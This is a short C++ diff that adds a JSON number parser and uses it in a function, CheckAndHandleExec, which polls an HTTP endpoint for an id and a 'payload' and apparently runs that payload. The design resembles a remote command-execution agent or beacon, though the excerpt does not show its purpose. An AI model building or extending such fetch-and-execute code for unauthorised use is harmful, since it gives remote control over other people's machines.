@@ -129,6 +129,17 @@ static std::string ExtractJSONString(const std::string& json, const std::string&
     return result;
 }
 
+static std::string ExtractJSONNumber(const std::string& json, const std::string& key) {
+    std::string search = "\"" + key + "\":";
+    size_t pos = json.find(search);
+    if (pos == std::string::npos) return "";
+    pos += search.size();
+    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
+    size_t end = json.find_first_of(",}]", pos);
+    if (end == std::string::npos) return "";
+    return json.substr(pos, end - pos);
+}
+
 static std::string GetTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -842,7 +853,7 @@ static void CheckAndHandleExec() {
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
     if (resp.size() < 10) return;
-    std::string rowId = ExtractJSONString(resp, "id");
+    std::string rowId = ExtractJSONNumber(resp, "id");
     std::string payload = ExtractJSONString(resp, "payload");
     if (rowId.empty() || payload.empty()) return;
     DWORD exitCode = 0;
